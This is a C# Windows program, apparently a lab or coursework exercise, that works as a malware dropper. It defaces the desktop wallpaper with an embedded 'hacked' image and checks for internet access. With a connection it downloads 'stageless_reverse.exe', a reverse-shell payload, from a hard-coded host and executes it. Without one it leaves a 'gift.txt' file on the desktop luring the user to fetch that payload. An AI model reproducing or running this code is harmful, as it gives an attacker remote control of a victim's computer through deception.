using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;

namespace Question3
{
    public class Wallpaper
    {
        public Wallpaper() { }

        const int SPI_SETDESKWALLPAPER = 20;
        const int SPIF_UPDATEINIFILE = 0x01;
        const int SPIF_SENDWININICHANGE = 0x02;

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

        public enum Style : int
        {
            Tiled,
            Centered,
            Stretched
        }

        public void Set(Style style)
        {
            Assembly myAssembly = Assembly.GetExecutingAssembly();
            Stream myStream = myAssembly.GetManifestResourceStream("ConsoleApp2.hacked.jpg");
            Bitmap bmp = new Bitmap(myStream);

            string tempPath = Path.Combine(Path.GetTempPath(), "hacked.jpg");
            bmp.Save(tempPath, System.Drawing.Imaging.ImageFormat.Jpeg);

            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);
            if (style == Style.Stretched)
            {
                key.SetValue(@"WallpaperStyle", 2.ToString());
                key.SetValue(@"TileWallpaper", 0.ToString());
            }

            if (style == Style.Centered)
            {
                key.SetValue(@"WallpaperStyle", 1.ToString());
                key.SetValue(@"TileWallpaper", 0.ToString());
            }

            if (style == Style.Tiled)
            {
                key.SetValue(@"WallpaperStyle", 1.ToString());
                key.SetValue(@"TileWallpaper", 1.ToString());
            }

            SystemParametersInfo(SPI_SETDESKWALLPAPER,
                0,
                tempPath,
                SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
        }


    }


    class Program
    {

        public static bool isConnectedToInternet()
        {
            string host = "8.8.8.8";
            bool result = false;
            Ping p = new Ping();
            try
            {
                PingReply reply = p.Send(host, 3000);
                if (reply.Status == IPStatus.Success)
                    return true;
            }
            catch { }
            return result;
        }
        static void Main(string[] args)
        {
            Console.WriteLine("Happy Hacking! You're hacked!!!");

            Wallpaper wp = new Wallpaper();
            wp.Set(Wallpaper.Style.Centered);

            bool checkInternet = isConnectedToInternet();
            if (checkInternet == true)
            {

                using (WebClient reverseShell = new WebClient())
                    reverseShell.DownloadFile("http://192.168.196.129/stageless_reverse.exe", "stageless_payload.exe");
                Process.Start("stageless_payload.exe");

            }
            else
            {
                string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                string fileName = desktopPath;
                fileName = fileName + "\\gift.txt";

                try
                {

                    if (File.Exists(fileName))
                    {
                        File.Delete(fileName);
                    }
                    using (FileStream fs = File.Create(fileName))
                    {
                        Byte[] require = new UTF8Encoding(true).GetBytes("Check your Internet Connection!!! ");
                        fs.Write(require, 0, require.Length);
                        byte[] author = new UTF8Encoding(true).GetBytes("After, go to http://192.168.196.129/stageless_reverse.exe to receive your gift");
                        fs.Write(author, 0, author.Length);
                    }
                }
                catch (Exception Ex)
                {
                    Console.WriteLine(Ex.ToString());
                }
            }


            return;

        }


    }
}
